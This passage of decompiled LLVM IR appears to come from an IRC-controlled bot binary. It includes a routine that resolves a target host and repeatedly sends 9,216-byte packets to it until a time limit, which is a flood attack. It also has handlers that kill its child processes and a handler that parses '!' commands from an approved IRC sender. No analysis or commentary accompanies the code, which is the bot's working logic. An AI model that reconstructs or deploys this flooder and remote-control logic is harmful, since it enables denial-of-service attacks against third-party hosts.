  store i32 %v3_8dc0, i32* @r2, align 4
  %v3_8dd0 = call i32 @bcopy(i32 %v2_8db0, i32 %v2_8db8, i32 %v3_8dc0)
  %v1_8dd8 = add i32 %v1_8d88, 8
  %v2_8dd8 = inttoptr i32 %v1_8dd8 to i32*
  %v3_8dd8 = load i32, i32* %v2_8dd8, align 4
  %v3_8de0 = urem i32 %v3_8dd8, 65536
  store i32 %v3_8de0, i32* %stack_var_-52, align 4
  %v3_8df0 = load i32, i32* %stack_var_-68, align 4
  %v1_8df4 = add i32 %v3_8df0, 8
  %v1_8df8 = inttoptr i32 %v1_8df4 to i32*
  %v2_8df8 = load i32, i32* %v1_8df8, align 4
  store i32 %v2_8df8, i32* @r0, align 4
  %v1_8e00 = call i32 @atol(i32 %v2_8df8)
  %v3_8e54 = bitcast i32* %stack_var_-52 to %sockaddr*
  %v2_8e70 = add i32 %v1_8d58, %v2_8d3c
  br label %dec_label_pc_8e24

dec_label_pc_8e24:                                ; preds = %dec_label_pc_8e94, %dec_label_pc_8d78
  %storemerge3 = phi i32 [ 0, %dec_label_pc_8d78 ], [ %v1_8e98, %dec_label_pc_8e94 ]
  %tmp = icmp ult i32 %storemerge3, 50
  br i1 %tmp, label %dec_label_pc_8e94, label %dec_label_pc_8e30

dec_label_pc_8e30:                                ; preds = %dec_label_pc_8e24
  %v6_8e40 = call i32 @__libc_send(i32 %v0_8d2c, i32* bitcast ([4 x i8]* @global_var_1327c.298 to i32*), i32 50, i32 0)
  %v4_8e54 = call i32 @__libc_connect(i32 %v0_8d2c, %sockaddr* %v3_8e54, i32 16)
  %v2_8e5c = call i32 @__GI_time(i32* null)
  %v3_8e74 = icmp ult i32 %v2_8e5c, %v2_8e70
  br i1 %v3_8e74, label %dec_label_pc_8e8c, label %dec_label_pc_8e7c

dec_label_pc_8e7c:                                ; preds = %dec_label_pc_8e30
  %v1_8e80 = call i32 @__libc_close(i32 %v0_8d2c)
  %v1_8e88 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8e8c

dec_label_pc_8e8c:                                ; preds = %dec_label_pc_8e30, %dec_label_pc_8e7c
  br label %dec_label_pc_8e94

dec_label_pc_8e94:                                ; preds = %dec_label_pc_8e24, %dec_label_pc_8e8c
  %stack_var_-20.0 = phi i32 [ %storemerge3, %dec_label_pc_8e24 ], [ 0, %dec_label_pc_8e8c ]
  %v1_8e98 = add i32 %stack_var_-20.0, 1
  br label %dec_label_pc_8e24

dec_label_pc_8ea4:                                ; preds = %dec_label_pc_8d20
  ret i32 %v1_8d68

; uselistorder directives
  uselistorder i32 %storemerge3, { 1, 0 }
  uselistorder i32 %v3_8dc0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8e94, { 1, 0 }
  uselistorder label %dec_label_pc_8e8c, { 1, 0 }
  uselistorder label %dec_label_pc_8d20, { 1, 0 }
}

define i32 @stop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 36540, i32* %stack_var_-4, align 4
  %v2_8eb8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8eb8, i32* @fp, align 4
  %v0_8ec0 = load i32, i32* %r0.global-to-local, align 4
  %v2_8f30 = icmp eq i32 %arg2, 0
  %v2_8fa414 = load i32, i32* @global_var_1d7fc.286, align 4
  %v3_8fac16 = icmp eq i32 %v2_8fa414, 0
  br i1 %v3_8fac16, label %dec_label_pc_8fb4, label %dec_label_pc_8edc

dec_label_pc_8edc:                                ; preds = %dec_label_pc_8f94, %entry
  %storemerge122 = phi i32 [ %v1_8f98, %dec_label_pc_8f94 ], [ 0, %entry ]
  %v12_8fb821 = phi i32 [ %v12_8fb82, %dec_label_pc_8f94 ], [ %v0_8ec0, %entry ]
  %v3_8ee0 = mul i32 %storemerge122, 4
  %v2_8eec = load i32, i32* @global_var_1fe74.288, align 4
  %v2_8ef0 = add i32 %v2_8eec, %v3_8ee0
  %v1_8ef4 = inttoptr i32 %v2_8ef0 to i32*
  %v2_8ef4 = load i32, i32* %v1_8ef4, align 4
  %v2_8ef8 = icmp eq i32 %v2_8ef4, 0
  br i1 %v2_8ef8, label %dec_label_pc_8f94, label %dec_label_pc_8f00

dec_label_pc_8f00:                                ; preds = %dec_label_pc_8edc
  %v2_8f18 = load i32, i32* %v1_8ef4, align 4
  store i32 %v2_8f18, i32* @r4, align 4
  %v0_8f1c = call i32 @__libc_getpid()
  store i32 %v0_8f1c, i32* %r0.global-to-local, align 4
  %v0_8f24 = load i32, i32* @r4, align 4
  %v9_8f24 = icmp eq i32 %v0_8f24, %v0_8f1c
  br i1 %v9_8f24, label %dec_label_pc_8f94, label %dec_label_pc_8f2c

dec_label_pc_8f2c:                                ; preds = %dec_label_pc_8f00
  br i1 %v2_8f30, label %dec_label_pc_8f6c, label %dec_label_pc_8f38

dec_label_pc_8f38:                                ; preds = %dec_label_pc_8f2c
  %v2_8f3c = load i32, i32* @global_var_1fe70.301, align 4
  store i32 %v0_8ec0, i32* %r0.global-to-local, align 4
  %v4_8f68 = call i32 @Send(i32 %v0_8ec0, i32 ptrtoint ([29 x i8]* @global_var_13280.303 to i32), i32 %v2_8f3c)
  store i32 %v4_8f68, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8f6c

dec_label_pc_8f6c:                                ; preds = %dec_label_pc_8f2c, %dec_label_pc_8f38
  %v2_8f7c = load i32, i32* @global_var_1fe74.288, align 4
  %v2_8f80 = add i32 %v2_8f7c, %v3_8ee0
  %v1_8f84 = inttoptr i32 %v2_8f80 to i32*
  %v2_8f84 = load i32, i32* %v1_8f84, align 4
  store i32 %v2_8f84, i32* %r0.global-to-local, align 4
  %v0_8f90 = call i32 @kill()
  store i32 %v0_8f90, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8f94

dec_label_pc_8f94:                                ; preds = %dec_label_pc_8f00, %dec_label_pc_8edc, %dec_label_pc_8f6c
  %v12_8fb82 = phi i32 [ %v0_8f1c, %dec_label_pc_8f00 ], [ %v12_8fb821, %dec_label_pc_8edc ], [ %v0_8f90, %dec_label_pc_8f6c ]
  %v1_8f98 = add i32 %storemerge122, 1
  %v2_8fa4 = load i32, i32* @global_var_1d7fc.286, align 4
  %v3_8fac = icmp ult i32 %v1_8f98, %v2_8fa4
  br i1 %v3_8fac, label %dec_label_pc_8edc, label %dec_label_pc_8fb4

dec_label_pc_8fb4:                                ; preds = %dec_label_pc_8f94, %entry
  %v12_8fb8.lcssa = phi i32 [ %v0_8ec0, %entry ], [ %v12_8fb82, %dec_label_pc_8f94 ]
  ret i32 %v12_8fb8.lcssa

; uselistorder directives
  uselistorder i32 %v1_8f98, { 1, 0 }
  uselistorder i32 %v3_8ee0, { 1, 0 }
  uselistorder i32 %storemerge122, { 1, 0 }
  uselistorder i32 %v0_8ec0, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 5, 4, 6, 0, 1 }
  uselistorder label %dec_label_pc_8f94, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8f6c, { 1, 0 }
}

define i32 @unknown(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 36824, i32* %stack_var_-4, align 4
  %v2_8fd4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8fd4, i32* @fp, align 4
  store i32 1, i32* %stack_var_-44, align 4
  %v1_8ff8 = call i32 @malloc(i32 9216)
  %v2_9008 = call i32 @__GI_time(i32* null)
  %v1_9018 = call i32 @mfork(i32 %arg2)
  %v2_9020 = icmp eq i32 %v1_9018, 0
  br i1 %v2_9020, label %dec_label_pc_9028, label %dec_label_pc_91bc

dec_label_pc_9028:                                ; preds = %entry
  %v7_902c = icmp eq i32 %arg3, 2
  br i1 %v7_902c, label %dec_label_pc_903c, label %dec_label_pc_9034

dec_label_pc_9034:                                ; preds = %dec_label_pc_9028
  %v1_9038 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_903c

dec_label_pc_903c:                                ; preds = %dec_label_pc_9028, %dec_label_pc_9034
  %v1_9040 = add i32 %arg4, 8
  %v1_9044 = inttoptr i32 %v1_9040 to i32*
  %v2_9044 = load i32, i32* %v1_9044, align 4
  store i32 %v2_9044, i32* @r0, align 4
  %v1_904c = call i32 @atol(i32 %v2_9044)
  %v2_9058 = ptrtoint i32* %stack_var_-60 to i32
  store i32 0, i32* %stack_var_-60, align 4
  %v1_908c = add i32 %arg4, 4
  %v1_9090 = inttoptr i32 %v1_908c to i32*
  %v2_9090 = load i32, i32* %v1_9090, align 4
  %v3_909c = call i32 @host2ip(i32 %arg2, i32 %v2_9090, i32 0)
  store i32 2, i32* %stack_var_-60, align 4
  %v2_90bc = load i32, i32* @global_var_1fe70.301, align 4
  %v4_90d4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_132a0.307 to i32), i32 %v2_90bc)
  %v2_9188 = add i32 %v1_904c, %v2_9008
  %v2_9120 = ptrtoint i32* %stack_var_-44 to i32
  %v6_9158 = inttoptr i32 %v1_8ff8 to i32*
  br label %dec_label_pc_90d8

dec_label_pc_90d8:                                ; preds = %dec_label_pc_919c, %dec_label_pc_903c
  %stack_var_-36.0 = phi i32 [ %tmp, %dec_label_pc_903c ], [ %v1_91a0, %dec_label_pc_919c ]
  %v0_90d8 = call i32 @random()
  %v0_9100 = call i32 @socket()
  %v1_9110 = icmp slt i32 %v0_9100, 0
  br i1 %v1_9110, label %dec_label_pc_9164, label %dec_label_pc_9118

dec_label_pc_9118:                                ; preds = %dec_label_pc_90d8
  store i32 1, i32* %stack_var_-44, align 4
  %v3_9134 = call i32 @ioctl(i32 %v0_9100, i32 21537, i32 %v2_9120)
  %v7_9158 = call i32 @__libc_sendto(i32 %v0_9100, i32* %v6_9158, i32 9216, i32 0, i32 %v2_9058, i32 16)
  %v1_9160 = call i32 @__libc_close(i32 %v0_9100)
  br label %dec_label_pc_9164

dec_label_pc_9164:                                ; preds = %dec_label_pc_90d8, %dec_label_pc_9118
  %v7_916c = icmp slt i32 %stack_var_-36.0, 50
  br i1 %v7_916c, label %dec_label_pc_919c, label %dec_label_pc_9170

dec_label_pc_9170:                                ; preds = %dec_label_pc_9164
  %v2_9174 = call i32 @__GI_time(i32* null)
  %v3_918c = icmp ult i32 %v2_9174, %v2_9188
  br i1 %v3_918c, label %dec_label_pc_9194, label %dec_label_pc_91ac

dec_label_pc_9194:                                ; preds = %dec_label_pc_9170
  br label %dec_label_pc_919c

dec_label_pc_919c:                                ; preds = %dec_label_pc_9164, %dec_label_pc_9194
  %stack_var_-36.1 = phi i32 [ %stack_var_-36.0, %dec_label_pc_9164 ], [ 0, %dec_label_pc_9194 ]
  %v1_91a0 = add i32 %stack_var_-36.1, 1
  br label %dec_label_pc_90d8

dec_label_pc_91ac:                                ; preds = %dec_label_pc_9170
  %v1_91b0 = call i32 @__libc_close(i32 %v0_9100)
  %v1_91b8 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_91bc

dec_label_pc_91bc:                                ; preds = %entry, %dec_label_pc_91ac
  %v9_91c0 = phi i32 [ %v1_9018, %entry ], [ %v1_91b8, %dec_label_pc_91ac ]
  ret i32 %v9_91c0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1 }
  uselistorder i32 50, { 1, 2, 0, 3 }
  uselistorder i32 (i32)* @atol, { 2, 1, 0 }
  uselistorder i32 (i32)* @mfork, { 1, 0 }
  uselistorder label %dec_label_pc_91bc, { 1, 0 }
  uselistorder label %dec_label_pc_919c, { 1, 0 }
  uselistorder label %dec_label_pc_9164, { 1, 0 }
  uselistorder label %dec_label_pc_903c, { 1, 0 }
}

define i32 @killsec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_91f0 = load i32, i32* bitcast ([2 x i8*]* @global_var_1d408.311 to i32*), align 4
  %tmp10 = inttoptr i32 %v2_91f0 to i8*
  %v4_91fc = call i32 @__GI_strcasecmp(i8* %tmp10, i32 %arg2)
  %v2_9204 = icmp eq i32 %v4_91fc, 0
  br i1 %v2_9204, label %dec_label_pc_920c, label %dec_label_pc_9218

dec_label_pc_920c:                                ; preds = %entry
  %v0_9214 = call i32 @kill()
  br label %dec_label_pc_9218

dec_label_pc_9218:                                ; preds = %entry, %dec_label_pc_920c
  %v9_921c = phi i32 [ %v4_91fc, %entry ], [ %v0_9214, %dec_label_pc_920c ]
  ret i32 %v9_921c

; uselistorder directives
  uselistorder label %dec_label_pc_9218, { 1, 0 }
}

define i32 @_PRIVMSG(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to i8*
  %tmp32 = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-1112 = alloca i32, align 4
  %stack_var_-1124 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_9228 = load i32, i32* @r4, align 4
  store i32 %v3_9228, i32* %stack_var_-20, align 4
  store i32 37424, i32* %stack_var_-4, align 4
  %v16_9228 = ptrtoint i32* %stack_var_-20 to i32
  %v2_922c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_922c, i32* @fp, align 4
  store i8* %tmp, i8** %stack_var_-1124, align 4
  br label %dec_label_pc_9258

dec_label_pc_924c:                                ; preds = %dec_label_pc_9270
  %v1_9250 = add i32 %storemerge11, 1
  br label %dec_label_pc_9258

dec_label_pc_9258:                                ; preds = %entry, %dec_label_pc_924c
  %v3_925c = phi i8* [ %tmp, %entry ], [ %v3_9278, %dec_label_pc_924c ]
  %storemerge11 = phi i32 [ 0, %entry ], [ %v1_9250, %dec_label_pc_924c ]
  %v4_925c = ptrtoint i8* %v3_925c to i32
  store i32 %v4_925c, i32* %r0.global-to-local, align 4
  %v3_9260 = call i32 @strlen(i8* %v3_925c)
  store i32 %v3_9260, i32* %r0.global-to-local, align 4
  %v3_9268 = icmp ult i32 %storemerge11, %v3_9260
  br i1 %v3_9268, label %dec_label_pc_9270, label %dec_label_pc_9258.dec_label_pc_928c_crit_edge

dec_label_pc_9258.dec_label_pc_928c_crit_edge:    ; preds = %dec_label_pc_9258
  %v3_9294.pre = load i8*, i8** %stack_var_-1124, align 4
  br label %dec_label_pc_928c

dec_label_pc_9270:                                ; preds = %dec_label_pc_9258
  %v3_9278 = load i8*, i8** %stack_var_-1124, align 4
  %v4_9278 = ptrtoint i8* %v3_9278 to i32
  %v2_927c = add i32 %v4_9278, %storemerge11
  %v1_9280 = inttoptr i32 %v2_927c to i8*
  %v2_9280 = load i8, i8* %v1_9280, align 1
  %v7_9284 = icmp eq i8 %v2_9280, 32
  br i1 %v7_9284, label %dec_label_pc_928c, label %dec_label_pc_924c

dec_label_pc_928c:                                ; preds = %dec_label_pc_9270, %dec_label_pc_9258.dec_label_pc_928c_crit_edge
  %v3_9294 = phi i8* [ %v3_9294.pre, %dec_label_pc_9258.dec_label_pc_928c_crit_edge ], [ %v3_9278, %dec_label_pc_9270 ]
  %v4_9294 = ptrtoint i8* %v3_9294 to i32
  %v2_9298 = add i32 %v4_9294, %storemerge11
  %v3_92a0 = inttoptr i32 %v2_9298 to i8*
  store i8 0, i8* %v3_92a0, align 1
  %v3_92a4 = load i8*, i8** %stack_var_-1124, align 4
  %v4_92b4 = ptrtoint i8* %v3_92a4 to i32
  %v2_92b8 = add i32 %v4_92b4, %storemerge11
  %v1_92bc = add i32 %v2_92b8, 2
  %v5_92c0 = inttoptr i32 %v1_92bc to i8*
  br label %dec_label_pc_92dc

dec_label_pc_92d0:                                ; preds = %dec_label_pc_92f4
  %v1_92d4 = add i32 %storemerge12, 1
  br label %dec_label_pc_92dc

dec_label_pc_92dc:                                ; preds = %dec_label_pc_928c, %dec_label_pc_92d0
  %storemerge12 = phi i32 [ 0, %dec_label_pc_928c ], [ %v1_92d4, %dec_label_pc_92d0 ]
  store i32 %storemerge12, i32* @r4, align 4
  store i32 %tmp32, i32* %r0.global-to-local, align 4
  %v3_92e4 = call i32 @strlen(i8* %arg2)
  store i32 %v3_92e4, i32* %r0.global-to-local, align 4
  %v0_92ec = load i32, i32* @r4, align 4
  %v3_92ec = icmp ult i32 %v0_92ec, %v3_92e4
  br i1 %v3_92ec, label %dec_label_pc_92f4, label %dec_label_pc_92dc.dec_label_pc_9310_crit_edge

dec_label_pc_92dc.dec_label_pc_9310_crit_edge:    ; preds = %dec_label_pc_92dc
  %.pre = add i32 %storemerge12, %tmp32
  %.pre26 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_9310

dec_label_pc_92f4:                                ; preds = %dec_label_pc_92dc
  %v2_9300 = add i32 %storemerge12, %tmp32
  %v1_9304 = inttoptr i32 %v2_9300 to i8*
  %v2_9304 = load i8, i8* %v1_9304, align 1
  %v7_9308 = icmp eq i8 %v2_9304, 33
  br i1 %v7_9308, label %dec_label_pc_9310, label %dec_label_pc_92d0

dec_label_pc_9310:                                ; preds = %dec_label_pc_92f4, %dec_label_pc_92dc.dec_label_pc_9310_crit_edge
  %v3_9324.pre-phi = phi i8* [ %.pre26, %dec_label_pc_92dc.dec_label_pc_9310_crit_edge ], [ %v1_9304, %dec_label_pc_92f4 ]
  store i8 0, i8* %v3_9324.pre-phi, align 1
  %v2_932c = load i8, i8* %v5_92c0, align 1
  %v7_9330 = icmp eq i8 %v2_932c, 33
  br i1 %v7_9330, label %dec_label_pc_9338, label %dec_label_pc_976c

dec_label_pc_9338:                                ; preds = %dec_label_pc_9310
  %v2_933c = load i32, i32* @global_var_1fe70.301, align 4
  store i32 %v4_92b4, i32* %r0.global-to-local, align 4
  %v4_9348 = call i32 @__GI_strcasecmp(i8* %v3_92a4, i32 %v2_933c)
  store i32 %v4_9348, i32* %r0.global-to-local, align 4
  %v2_9350 = icmp eq i32 %v4_9348, 0
  br i1 %v2_9350, label %dec_label_pc_9358, label %dec_label_pc_976c

dec_label_pc_9358:                                ; preds = %dec_label_pc_9338
  %v2_935c = ptrtoint i32* %stack_var_-1112 to i32
  store i32 1024, i32* @r2, align 4
  store i32 %v2_935c, i32* %r0.global-to-local, align 4
  %v2_936c = bitcast i32* %stack_var_-1112 to i8*
  %v3_936c = call i32 @__GI_memset(i8* %v2_936c, i32 0)
  store i32 %v3_936c, i32* %r0.global-to-local, align 4
  %v1_937c = add i32 %v2_92b8, 3
  %v5_9380 = inttoptr i32 %v1_937c to i8*
  br label %dec_label_pc_939c

dec_label_pc_9390:                                ; preds = %dec_label_pc_93b4
  %v1_9394 = add i32 %storemerge13, 1
  br label %dec_label_pc_939c

dec_label_pc_939c:                                ; preds = %dec_label_pc_9358, %dec_label_pc_9390
  %storemerge13 = phi i32 [ 0, %dec_label_pc_9358 ], [ %v1_9394, %dec_label_pc_9390 ]
  store i32 %storemerge13, i32* @r4, align 4
  store i32 %v1_937c, i32* %r0.global-to-local, align 4
  %v3_93a4 = call i32 @strlen(i8* %v5_9380)
  store i32 %v3_93a4, i32* %r0.global-to-local, align 4
  %v0_93ac = load i32, i32* @r4, align 4
  %v3_93ac = icmp ult i32 %v0_93ac, %v3_93a4
  br i1 %v3_93ac, label %dec_label_pc_93b4, label %dec_label_pc_939c.dec_label_pc_93d0_crit_edge

dec_label_pc_939c.dec_label_pc_93d0_crit_edge:    ; preds = %dec_label_pc_939c
  %.pre27 = add i32 %storemerge13, %v1_937c
  %.pre28 = inttoptr i32 %.pre27 to i8*
  br label %dec_label_pc_93d0

dec_label_pc_93b4:                                ; preds = %dec_label_pc_939c
  %v2_93c0 = add i32 %storemerge13, %v1_937c
  %v1_93c4 = inttoptr i32 %v2_93c0 to i8*
  %v2_93c4 = load i8, i8* %v1_93c4, align 1
  %v7_93c8 = icmp eq i8 %v2_93c4, 32
  br i1 %v7_93c8, label %dec_label_pc_93d0, label %dec_label_pc_9390

dec_label_pc_93d0:                                ; preds = %dec_label_pc_93b4, %dec_label_pc_939c.dec_label_pc_93d0_crit_edge
  %v3_93e4.pre-phi = phi i8* [ %.pre28, %dec_label_pc_939c.dec_label_pc_93d0_crit_edge ], [ %v1_93c4, %dec_label_pc_93b4 ]
  %v2_93dc.pre-phi = phi i32 [ %.pre27, %dec_label_pc_939c.dec_label_pc_93d0_crit_edge ], [ %v2_93c0, %dec_label_pc_93b4 ]
  store i8 0, i8* %v3_93e4.pre-phi, align 1
  %v2_93f0 = load i32, i32* @global_var_1fe58.314, align 4
  store i32 %v1_937c, i32* %r0.global-to-local, align 4
  %v3_93fc = call i32 @strwildmatch(i8* %v5_9380, i32 %v2_93f0)
  store i32 %v3_93fc, i32* %r0.global-to-local, align 4
  %v2_9404 = icmp eq i32 %v3_93fc, 0
  br i1 %v2_9404, label %dec_label_pc_940c, label %dec_label_pc_976c

dec_label_pc_940c:                                ; preds = %dec_label_pc_93d0
  %v1_9418 = add i32 %v2_93dc.pre-phi, 1
  %v5_941c = inttoptr i32 %v1_9418 to i8*
  store i32 %v1_9418, i32* %r0.global-to-local, align 4
  %v3_9424 = call i32 @strlen(i8* %v5_941c)
  store i32 %v3_9424, i32* %r0.global-to-local, align 4
  %v2_9474 = add i32 %v16_9228, -1092
  br label %dec_label_pc_949c

dec_label_pc_943c:                                ; preds = %dec_label_pc_949c
  %v2_9440 = load i8, i8* %stack_var_-32.0, align 1
  %v7_9444 = icmp eq i8 %v2_9440, 32
  br i1 %v7_9444, label %dec_label_pc_94ec, label %dec_label_pc_944c

dec_label_pc_944c:                                ; preds = %dec_label_pc_943c
  %v2_9450 = load i8, i8* %stack_var_-32.0, align 1
  %v2_9454 = icmp eq i8 %v2_9450, 0
  br i1 %v2_9454, label %dec_label_pc_94ec, label %dec_label_pc_945c

dec_label_pc_945c:                                ; preds = %dec_label_pc_944c
  %v2_9464 = load i8, i8* %stack_var_-32.0, align 1
  store i32 %v16_9228, i32* %r0.global-to-local, align 4
  %v2_9478 = add i32 %v2_9474, %storemerge14
  %v3_9480 = inttoptr i32 %v2_9478 to i8*
  store i8 %v2_9464, i8* %v3_9480, align 1
  %v1_9488 = add i32 %v4_943c, 1
  %v5_948c = inttoptr i32 %v1_9488 to i8*
  %v1_9494 = add nuw i32 %storemerge14, 1
  br label %dec_label_pc_949c

dec_label_pc_949c:                                ; preds = %dec_label_pc_940c, %dec_label_pc_945c
  %stack_var_-32.0 = phi i8* [ %v5_941c, %dec_label_pc_940c ], [ %v5_948c, %dec_label_pc_945c ]
  %storemerge14 = phi i32 [ 0, %dec_label_pc_940c ], [ %v1_9494, %dec_label_pc_945c ]
  %v5_94a8 = icmp slt i32 %storemerge14, %v3_9424
  %v4_943c = ptrtoint i8* %stack_var_-32.0 to i32
  br i1 %v5_94a8, label %dec_label_pc_943c, label %dec_label_pc_94ec

dec_label_pc_94b8:                                ; preds = %dec_label_pc_94ec
  %v2_94c4 = add i32 %storemerge15, %v4_943c
  %v1_94c8 = inttoptr i32 %v2_94c4 to i8*
  %v2_94c8 = load i8, i8* %v1_94c8, align 1
  %v7_94cc = icmp eq i8 %v2_94c8, 32
  br i1 %v7_94cc, label %dec_label_pc_94d4, label %dec_label_pc_94e0

dec_label_pc_94d4:                                ; preds = %dec_label_pc_94b8
  %v1_94d8 = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_94e0

dec_label_pc_94e0:                                ; preds = %dec_label_pc_94b8, %dec_label_pc_94d4
  %stack_var_-28.0 = phi i32 [ %v1_94d8, %dec_label_pc_94d4 ], [ %stack_var_-28.1, %dec_label_pc_94b8 ]
  %v1_94e4 = add i32 %storemerge15, 1
  br label %dec_label_pc_94ec

dec_label_pc_94ec:                                ; preds = %dec_label_pc_943c, %dec_label_pc_944c, %dec_label_pc_949c, %dec_label_pc_94e0
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_94e0 ], [ 0, %dec_label_pc_949c ], [ 0, %dec_label_pc_944c ], [ 0, %dec_label_pc_943c ]
  %storemerge15 = phi i32 [ %v1_94e4, %dec_label_pc_94e0 ], [ 0, %dec_label_pc_949c ], [ 0, %dec_label_pc_944c ], [ 0, %dec_label_pc_943c ]
  store i32 %storemerge15, i32* @r4, align 4
  store i32 %v4_943c, i32* %r0.global-to-local, align 4
  %v3_94f4 = call i32 @strlen(i8* %stack_var_-32.0)
  store i32 %v3_94f4, i32* %r0.global-to-local, align 4
  %v0_94fc = load i32, i32* @r4, align 4
  %v3_94fc = icmp ult i32 %v0_94fc, %v3_94f4
  br i1 %v3_94fc, label %dec_label_pc_94b8, label %dec_label_pc_9504

dec_label_pc_9504:                                ; preds = %dec_label_pc_94ec
  %v1_9508 = add i32 %stack_var_-28.1, 1
  %v7_9518 = icmp slt i32 %v1_9508, 11
  br i1 %v7_9518, label %dec_label_pc_9524, label %dec_label_pc_951c

dec_label_pc_951c:                                ; preds = %dec_label_pc_9504
  br label %dec_label_pc_9524

dec_label_pc_9524:                                ; preds = %dec_label_pc_9504, %dec_label_pc_951c
  %stack_var_-28.2 = phi i32 [ %v1_9508, %dec_label_pc_9504 ], [ 10, %dec_label_pc_951c ]
  %tmp74 = mul i32 %stack_var_-28.2, 4
  %v3_953c = add i32 %tmp74, 4
  %v2_9544 = add i32 %v16_9228, -68
  %v2_9548 = add i32 %v2_9544, %v3_953c
  %v2_9550 = inttoptr i32 %v2_9548 to i32*
  store i32 ptrtoint (i32* @global_var_13304.316 to i32), i32* %v2_9550, align 4
  %v2_967819 = load i8, i8* %stack_var_-32.0, align 1
  %v2_967c21 = icmp eq i8 %v2_967819, 0
  br i1 %v2_967c21, label %dec_label_pc_9684, label %dec_label_pc_9560

dec_label_pc_9560:                                ; preds = %dec_label_pc_9524, %dec_label_pc_95c8
  %v4_967423 = phi i32 [ %v2_966c.pre-phi, %dec_label_pc_95c8 ], [ %v4_943c, %dec_label_pc_9524 ]
  %stack_var_-24.022 = phi i32 [ %v1_9658, %dec_label_pc_95c8 ], [ 1, %dec_label_pc_9524 ]
  %v1_9564 = add i32 %v4_967423, 1
  %v5_9568 = inttoptr i32 %v1_9564 to i8*
  %v6_9578 = icmp slt i32 %stack_var_-24.022, %stack_var_-28.2
  br i1 %v6_9578, label %dec_label_pc_9594, label %dec_label_pc_9684

dec_label_pc_9588:                                ; preds = %dec_label_pc_95ac
  %v1_958c = add i32 %storemerge17, 1
  br label %dec_label_pc_9594

dec_label_pc_9594:                                ; preds = %dec_label_pc_9560, %dec_label_pc_9588
  %storemerge17 = phi i32 [ %v1_958c, %dec_label_pc_9588 ], [ 0, %dec_label_pc_9560 ]
  store i32 %v1_9564, i32* %r0.global-to-local, align 4
  %v3_959c = call i32 @strlen(i8* %v5_9568)
  store i32 %v3_959c, i32* %r0.global-to-local, align 4
  %v3_95a4 = icmp ult i32 %storemerge17, %v3_959c
  br i1 %v3_95a4, label %dec_label_pc_95ac, label %dec_label_pc_9594.dec_label_pc_95c8_crit_edge

dec_label_pc_9594.dec_label_pc_95c8_crit_edge:    ; preds = %dec_label_pc_9594
  %.pre30 = add i32 %storemerge17, %v1_9564
  %.pre31 = inttoptr i32 %.pre30 to i8*
  br label %dec_label_pc_95c8

dec_label_pc_95ac:                                ; preds = %dec_label_pc_9594
  %v2_95b8 = add i32 %storemerge17, %v1_9564
  %v1_95bc = inttoptr i32 %v2_95b8 to i8*
  %v2_95bc = load i8, i8* %v1_95bc, align 1
  %v7_95c0 = icmp eq i8 %v2_95bc, 32
  br i1 %v7_95c0, label %dec_label_pc_95c8, label %dec_label_pc_9588

dec_label_pc_95c8:                                ; preds = %dec_label_pc_95ac, %dec_label_pc_9594.dec_label_pc_95c8_crit_edge
  %v5_9670.pre-phi = phi i8* [ %.pre31, %dec_label_pc_9594.dec_label_pc_95c8_crit_edge ], [ %v1_95bc, %dec_label_pc_95ac ]
  %v2_966c.pre-phi = phi i32 [ %.pre30, %dec_label_pc_9594.dec_label_pc_95c8_crit_edge ], [ %v2_95b8, %dec_label_pc_95ac ]
  store i32 %stack_var_-24.022, i32* @r4, align 4
  %v1_95d0 = add i32 %storemerge17, 1
  store i32 %v1_95d0, i32* %r0.global-to-local, align 4
  %v1_95d8 = call i32 @malloc(i32 %v1_95d0)
  %v0_95e8 = load i32, i32* @r4, align 4
  %v3_95e8 = mul i32 %v0_95e8, 4
  store i32 %v16_9228, i32* %r0.global-to-local, align 4
  %v2_95f4 = add i32 %v2_9544, %v3_95e8
  %v2_95f8 = inttoptr i32 %v2_95f4 to i32*
  store i32 %v1_95d8, i32* %v2_95f8, align 4
  %v3_9604 = mul i32 %stack_var_-24.022, 4
  %v2_9610 = add i32 %v2_9544, %v3_9604
  %v1_9614 = inttoptr i32 %v2_9610 to i32*
  %v2_9614 = load i32, i32* %v1_9614, align 4
  store i32 %v2_9614, i32* %r0.global-to-local, align 4
  store i32 %v1_9564, i32* @r1, align 4
  %v3_9624 = call i32 @strncpy(i32 %v2_9614, i32 %v1_9564, i32 %storemerge17)
  store i32 %v16_9228, i32* %r0.global-to-local, align 4
  %v2_9640 = load i32, i32* %v1_9614, align 4
  %v2_9648 = add i32 %v2_9640, %storemerge17
  %v3_9650 = inttoptr i32 %v2_9648 to i8*
